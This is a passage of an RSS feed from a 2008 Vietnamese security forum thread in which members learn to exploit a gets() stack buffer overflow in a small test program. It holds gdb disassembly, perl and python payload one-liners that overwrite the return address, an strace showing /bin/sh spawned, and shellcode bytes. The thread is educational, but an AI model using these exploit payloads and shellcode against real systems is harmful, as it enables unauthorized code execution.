+Đúng. độ lớn của stack frame phụ thuộc vào thông số này. Gcc 4.2.x mặc định sẽ gán kích thước của buffer và biến cục bộ và thêm padding sao cho địa chỉ stack (địa chỉ thanh ghi ESP) luôn là bội số của 16 (1 paragraph). Vì thế mà nếu không gán stack-boundary=2 (ESP là bội số của 4 bytes) thì gcc phải tự tính toán để điều chỉnh lại giá trị của buffer sao cho phù hợp. Lấy ví dụ chương trình của tớ nếu để stack boundary mặc định thì sẽ có mã asm tương tự chương trình anh mrro ở trên. Trong mã ASM ở trên cậu cũng có thể thấy các đoạn mã nhằm hiệu chỉnh stack sao cho nó là bội của 16
+
+Ví dụ ở các chỗ tớ bôi màu vàng
+<blockquote> (gdb) disas main
+ Dump of assembler code for function main:
+ 0x080483a4 &lt;main+0&gt;:    lea    0x4(%esp),%ecx
+ 0x080483a8 &lt;main+4&gt;:    <font color='yellow'>and    $0xfffffff0,%esp</font>
+ 0x080483ab &lt;main+7&gt;:    pushl  -0x4(%ecx)
+ 0x080483ae &lt;main+10&gt;:   push   %ebp
+ 0x080483af &lt;main+11&gt;:   mov    %esp,%ebp
+ 0x080483b1 &lt;main+13&gt;:   push   %ecx
+ 0x080483b2 &lt;main+14&gt;:   <font color='yellow'>sub    $0x24,%esp</font>
+ 0x080483b5 &lt;main+17&gt;:   movl   $0x80484b0,(%esp)
+ 0x080483bc &lt;main+24&gt;:   call   0x804830c &lt;printf@plt&gt;
+ 0x080483c1 &lt;main+29&gt;:   lea    -0xc(%ebp),%eax
+ 0x080483c4 &lt;main+32&gt;:   mov    %eax,(%esp)
+ 0x080483c7 &lt;main+35&gt;:   call   0x80482ec &lt;gets@plt&gt;
+ 0x080483cc &lt;main+40&gt;:   lea    -0xc(%ebp),%eax
+ 0x080483cf &lt;main+43&gt;:   mov    %eax,0x4(%esp)
+ 0x080483d3 &lt;main+47&gt;:   movl   $0x80484c4,(%esp)
+ 0x080483da &lt;main+54&gt;:   call   0x804830c &lt;printf@plt&gt;
+ 0x080483df &lt;main+59&gt;:   mov    $0x0,%eax
+ 0x080483e4 &lt;main+64&gt;:   add    $0x24,%esp
+ 0x080483e7 &lt;main+67&gt;:   pop    %ecx
+ 0x080483e8 &lt;main+68&gt;:   pop    %ebp
+ 0x080483e9 &lt;main+69&gt;:   lea    -0x4(%ecx),%esp
+ 0x080483ec &lt;main+72&gt;:   ret    
+ End of assembler dump.
+&nbsp;
+		</blockquote>
+ 
+Vì con trỏ, độ lớn biến nguyên ... đều chiếm 4 bytes nên nếu để stack-boundary=2 (bội 4) thì việc tính toán, hiệu chỉnh sẽ trở nên đơn giản hơn. Vì thế code assembly sạch đẹp hơn, dễ nhìn, dễ exploit hơn :D. 
+
+@mrro: em nghĩ tăng độ dài buffer thêm 4 bytes là vượt qua được chương trình trên để ghi đè RIP đúng không nhỉ? :D 
+
+Vấn đề là tớ đã chỉnh lại độ dài buffer, điều chỉnh lại địa chỉ nhảy về... nhưng chương trình vẫn không thể nhảy đến đoạn shellcode được. Không hiểu thế nào. Mọi người xem
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>Tal@vxer:~/Documents/Research$ export CODE=`cat shellcode`
+Tal@vxer:~/Documents/Research$ ./getenv CODE
+CODE is located at 0xbfffff5a
+Tal@vxer:~/Documents/Research$ ./getname 
+What is your name: hello
+Aha, your name is: hello
+Tal@vxer:~/Documents/Research$ perl -e "A"x12 . "\x5a\xff\xff\xbf" | ./getname 
+What is your name: Aha, your name is: ����������P���
+Tal@vxer:~/Documents/Research$</pre>
+		</div>
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#149202</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#149202</link>
+				<pubDate><![CDATA[Sun, 31 Aug 2008 16:33:39]]> GMT</pubDate>
+				<author><![CDATA[ Tal]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ @Tal: bồ thử chạy cái này xem output của strace là gì vậy? Trong đó có xuất hiện mấy cái syscall mà bồ sử dụng trong shellcode hay không?
+
+<blockquote>
+$ perl -e "A"x12 . "\x5a\xff\xff\xbf" | strace ./getname 
+&nbsp;
+		</blockquote>
+
+--m]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#149215</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#149215</link>
+				<pubDate><![CDATA[Sun, 31 Aug 2008 21:07:54]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ Output của nó đây, và hàm cần thực hiện cũng đã thấy rồi.
+<blockquote>
+execve("./getname", ["./getname"], [/* 38 vars */]) = 0
+brk(0)                                  = 0x804a000
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe1000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=50236, ...}) = 0
+mmap2(NULL, 50236, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd4000
+close(3)                                = 0
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3
+read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1"..., 512) = 512
+fstat64(3, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e85000
+mmap2(0xb7fce000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x149) = 0xb7fce000
+mmap2(0xb7fd1000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fd1000
+close(3)                                = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e84000
+set_thread_area({entry_number:-1 -&gt; 6, base_addr:0xb7e846b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+mprotect(0xb7fce000, 4096, PROT_READ)   = 0
+munmap(0xb7fd4000, 50236)               = 0
+fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe0000
+fstat64(0, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdf000
+read(0, "AAAAAAAAAAAAZ\377\377\277", 1024) = 16
+read(0, "", 1024)                       = 0
+write(1, "What is your name: Aha, your nam"..., 55What is your name: Aha, your name is: AAAAAAAAAAAAZ���
+) = 55
+execve("��", ["\234\255\24"], [/* 0 vars */]) = -1 ENOENT (No such file or directory)
+<font color='yellow'>execve("/bin/sh", ["/bin/sh"], [/* 0 vars */]) = 0</font>
+brk(0)                                  = 0x805e000
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe1000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=50236, ...}) = 0
+mmap2(NULL, 50236, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd4000
+close(3)                                = 0
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3
+read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1"..., 512) = 512
+fstat64(3, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e85000
+mmap2(0xb7fce000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x149) = 0xb7fce000
+mmap2(0xb7fd1000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fd1000
+close(3)                                = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e84000
+set_thread_area({entry_number:-1 -&gt; 6, base_addr:0xb7e846b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+mprotect(0xb7fce000, 4096, PROT_READ)   = 0
+munmap(0xb7fd4000, 50236)               = 0
+getpid()                                = 6412
+rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+geteuid32()                             = 1000
+getppid()                               = 6411
+brk(0)                                  = 0x805e000
+brk(0x807f000)                          = 0x807f000
+getcwd("/home/haprog/Documents/Research", 4096) = 32
+ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffffd18) = -1 EINVAL (Invalid argument)
+rt_sigaction(SIGINT, NULL, {SIG_DFL}, 8) = 0
+rt_sigaction(SIGINT, {SIG_DFL}, NULL, 8) = 0
+rt_sigaction(SIGQUIT, NULL, {SIG_DFL}, 8) = 0
+rt_sigaction(SIGQUIT, {SIG_DFL}, NULL, 8) = 0
+rt_sigaction(SIGTERM, NULL, {SIG_DFL}, 8) = 0
+rt_sigaction(SIGTERM, {SIG_DFL}, NULL, 8) = 0
+read(0, "", 8192)                       = 0
+exit_group(0)                           = ?
+Process 6412 detached
+&nbsp;
+		</blockquote>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#149248</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#149248</link>
+				<pubDate><![CDATA[Mon, 1 Sep 2008 10:56:56]]> GMT</pubDate>
+				<author><![CDATA[ Tal]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">mrro wrote:</cite><br>
+		<blockquote>@Cognac: lúc đó sẽ có hai trường hợp:
+
+- có SSP <span class="link"> http://www.trl.ibm.com/projects/security/ssp/</span>) hay không? nếu có SSP thì đối với đoạn mã này mặc dù bị lỗi nhưng sẽ kô thể khai thác được, chỉ có làm cho chương trình nó crash thôi. 
+
+- không có SSP (compile với option <b>-fno-stack-protector</b>), lúc này mã dissasembly của đoạn chương trình trên sẽ như sau:
+
+<blockquote>(gdb) disas main
+Dump of assembler code for function main:
+0x080483a4 &lt;main+0&gt;:    lea    0x4(%esp),%ecx
+0x080483a8 &lt;main+4&gt;:    and    $0xfffffff0,%esp
+0x080483ab &lt;main+7&gt;:    pushl  -0x4(%ecx)
+0x080483ae &lt;main+10&gt;:   push   %ebp
+0x080483af &lt;main+11&gt;:   mov    %esp,%ebp
+0x080483b1 &lt;main+13&gt;:   push   %ecx
+0x080483b2 &lt;main+14&gt;:   sub    $0x24,%esp
+0x080483b5 &lt;main+17&gt;:   movl   $0x80484b0,(%esp)
+0x080483bc &lt;main+24&gt;:   call   0x804830c &lt;printf@plt&gt;
+0x080483c1 &lt;main+29&gt;:   lea    -0xc(%ebp),%eax
+0x080483c4 &lt;main+32&gt;:   mov    %eax,(%esp)
+0x080483c7 &lt;main+35&gt;:   call   0x80482ec &lt;gets@plt&gt;
+0x080483cc &lt;main+40&gt;:   lea    -0xc(%ebp),%eax
+0x080483cf &lt;main+43&gt;:   mov    %eax,0x4(%esp)
+0x080483d3 &lt;main+47&gt;:   movl   $0x80484c4,(%esp)
+0x080483da &lt;main+54&gt;:   call   0x804830c &lt;printf@plt&gt;
+0x080483df &lt;main+59&gt;:   mov    $0x0,%eax
+0x080483e4 &lt;main+64&gt;:   add    $0x24,%esp
+0x080483e7 &lt;main+67&gt;:   pop    %ecx
+0x080483e8 &lt;main+68&gt;:   pop    %ebp
+<font color='yellow'>0x080483e9 &lt;main+69&gt;:   lea    -0x4(%ecx),%esp</font>
+0x080483ec &lt;main+72&gt;:   ret    
+End of assembler dump.&nbsp;
+		</blockquote>
+
+
+Hơi khó exploit một chút, nhưng vẫn có thể exploit được. Bồ thử tìm hiểu cách exploit xem, gợi ý: chú ý vào <b>ecx</b>.
+
+--m&nbsp;
+		</blockquote>
+Đoạn tô vàng có nghĩa là lấy thanh ghi [ecx] -4, rồi move vào esp và ret???
+Vậy thì tui sẽ viết đè lên ecx với địa chị ($ebp+4), sau đó overwrite tiếp lên ebp địa chỉ của shellcode:
+mrro thử chạy
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>python -c 'print "A" * 8 + "\xb2\x83\x04\x08" + "\xAA\xBB\XCC\XDD"' | ./vul</pre>
+		</div>
+Trong đó \xAA\xBB\XCC\XDD là địa chỉ biến môi trường chứa shellcode chẳng hạn.
+Mô hình stack trong trường hợp này:
+
+high mem    --------------------------------------------------------&gt;  low mem
+[*argv]   [argc  ]  [eip  ]   [  %ecx-4   ]   [ebp  ]   [ecx   ]   [buf[8] ]
+
+
+
+PS: Tui ko nhớ cách input dạng này trong gdb khi run, bác mrro chỉ tui được ko?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#149739</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#149739</link>
+				<pubDate><![CDATA[Thu, 4 Sep 2008 18:46:00]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ @Cognac: good job. Nhưng nếu giờ kích hoạt ASLR thì exploit sao?
+
+<p></p>
+		<cite class="blockquote">Cognac wrote:</cite><br>
+		<blockquote>
+ PS: Tui ko nhớ cách input dạng này trong gdb khi run, bác mrro chỉ tui được ko?  
+&nbsp;
+		</blockquote>
+
+Hai bước (học lóm của <b>lamer</b>):
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>1. python -c 'print "A" * 8 + "\xb2\x83\x04\x08" + "\xAA\xBB\XCC\XDD"' &gt; exp
+
+2. gdb&gt; run &lt; exp</pre>
+		</div>
+
+--m]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#149743</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#149743</link>
+				<pubDate><![CDATA[Thu, 4 Sep 2008 19:08:59]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ @Tal: tui cũng đang coi cái trường hợp của bồ, vẫn chưa hiểu sao nó kô spawn shell, nhưng lại có thể các đoạn shellcode khác.
+
+Bồ thử đoạn shellcode in ra ngày tháng này xem có chạy được hông nhé:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>char shellcode&#91;&#93; =
+        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
+        "\x50\x66\x68\x2d\x63\x89\xe1\x50\x68\x64\x61\x74\x65\x89\xe2"
+        "\x50\x52\x51\x53\x89\xe1\x99\xb0\x0b\xcd\x80\xb0\x01\x31\xdb"
+        "\xcd\x80";</pre>
+		</div>
+
+--m]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#149745</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#149745</link>
+				<pubDate><![CDATA[Thu, 4 Sep 2008 19:11:00]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ @mrro: Không chạy được anh ạ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/24349.hva#149888</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/24349.hva#149888</link>
+				<pubDate><![CDATA[Fri, 5 Sep 2008 15:17:35]]> GMT</pubDate>
+				<author><![CDATA[ Tal]]></author>
+			</item>
+	</channel>
+</rss>
